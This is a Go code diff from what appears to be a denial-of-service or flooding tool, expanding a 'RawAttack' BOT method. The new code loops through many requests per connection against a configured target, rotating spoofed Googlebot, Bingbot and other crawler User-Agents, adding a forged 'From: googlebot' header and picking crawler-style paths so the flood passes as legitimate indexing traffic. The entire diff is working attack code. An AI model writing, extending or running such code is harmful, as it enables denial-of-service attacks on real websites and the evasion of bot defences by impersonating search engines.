@@ -317,22 +317,71 @@ func (r *RawAttack) executeCFBUAM(ctx context.Context) error {
 	return nil
 }
 
-func (r *RawAttack) executeBOT(_ context.Context) error {
+func (r *RawAttack) executeBOT(ctx context.Context) error {
+	// Advanced BOT logic: Simulates Search Engine Crawlers (Googlebot, Bingbot, etc.)
+	// Rotates legitimate Bot User-Agents and hits typical crawler endpoints (robots.txt, sitemaps).
+	// Uses Keep-Alive to perform multiple checks per connection.
+
 	conn, err := CreateRawConnection(r.Config.Target, r.Config)
 	if err != nil {
 		return err
 	}
 	defer conn.Close()
 
+	bots := []string{
+		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+		"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+		"Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)",
+		"Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)",
+	}
+
+	paths := []string{
+		"/robots.txt",
+		"/sitemap.xml",
+		"/sitemap_index.xml",
+		"/feed",
+		"/rss",
+		"/atom.xml",
+		"/",
+	}
+
 	targetURL, _ := url.Parse(r.Config.Target)
-	userAgent := "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
 
-	robotsReq := fmt.Sprintf("GET /robots.txt HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", targetURL.Host, userAgent)
-	conn.Write([]byte(robotsReq))
-	r.Config.RequestsSent.Add(1)
-	r.Config.BytesSent.Add(int64(len(robotsReq)))
+	for i := 0; i < r.Config.RPC; i++ {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		default:
+		}
 
-	// Simplified BOT logic
+		ua := bots[mrand.IntN(len(bots))]
+		path := paths[mrand.IntN(len(paths))]
+
+		headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
+		headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
+		headers += fmt.Sprintf("User-Agent: %s\r\n", ua)
+		headers += "Accept: text/plain,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+		headers += "Connection: keep-alive\r\n"
+		headers += "From: googlebot(at)googlebot.com\r\n"
+		headers += "\r\n"
+
+		n, err := conn.Write([]byte(headers))
+		if err != nil {
+			break
+		}
+		r.Config.RequestsSent.Add(1)
+		r.Config.BytesSent.Add(int64(n))
+
+		// Optional: Minimal read to keep connection healthy (clearing buffer)
+		// but don't block too long
+		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+		buf := make([]byte, 128)
+		conn.Read(buf)                    // Ignore error, just trying to clear socket
+		conn.SetReadDeadline(time.Time{}) // Reset
+	}
 	return nil
 }
 
